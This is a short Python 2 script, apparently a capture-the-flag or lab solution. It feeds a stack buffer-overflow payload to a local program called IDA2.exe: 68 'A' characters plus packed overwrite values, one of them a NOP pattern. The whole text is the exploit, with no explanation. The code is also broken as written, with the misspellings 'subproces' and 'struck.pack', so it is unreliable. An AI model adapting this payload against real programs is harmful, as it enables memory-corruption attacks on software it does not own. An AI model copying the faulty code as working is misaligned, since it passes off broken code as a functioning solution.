from subproces import *
import struct

p = Popen([r'IDA2.exe','f'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)

# < = little-endian
# L = unsigned long
# https://docs.python.org/2/library/struct.html
qrst = struct.pack("<L", 0x71727374)
str2 = struck.pack("<L", 0x91929394)
flag = struck.pack("<L", 0x90909090)

first = 68 * "A" + qrst + flag + str2
p.stdin.write(first)

response = p.communicate()[0]
print first
print (response)